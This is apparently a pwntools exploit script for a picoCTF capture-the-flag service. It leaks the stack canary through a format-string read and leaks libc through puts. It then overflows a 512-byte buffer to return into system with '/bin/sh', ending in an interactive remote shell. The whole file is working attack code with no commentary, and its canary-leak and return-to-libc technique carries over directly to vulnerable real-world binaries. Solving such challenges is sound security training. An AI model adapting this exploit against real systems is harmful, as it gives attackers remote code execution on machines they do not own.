from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'shape-facility.picoctf.net', 60820

r = remote(HOST, PORT)

n = -863
n = -3727

main = 0x80487ff
win = 0x804876e
puts_plt = 0x80484c0
puts_got = 0x8049fdc
gets_got = 0x8049fcc

r.sendline(str(n))
r.sendline('%135$p')
r.recvuntil('Congrats: ')
canary = int(r.recvline().decode(), 16)

r.sendline(str(n))
r.sendline(b'A' * 512 + p32(canary) + b'A' * 12 + p32(puts_plt) + p32(win) + p32(puts_got))
r.recvuntil('A\n\n')
puts_libc = u32(r.recv(4))
libc = puts_libc - 0x67560
sys_libc = libc + 0x3cf10
binsh = libc + 0x17b9db

r.sendline(b'A' * 512 + p32(canary) + b'A' * 12 + p32(sys_libc) + p32(win) + p32(binsh))

r.interactive()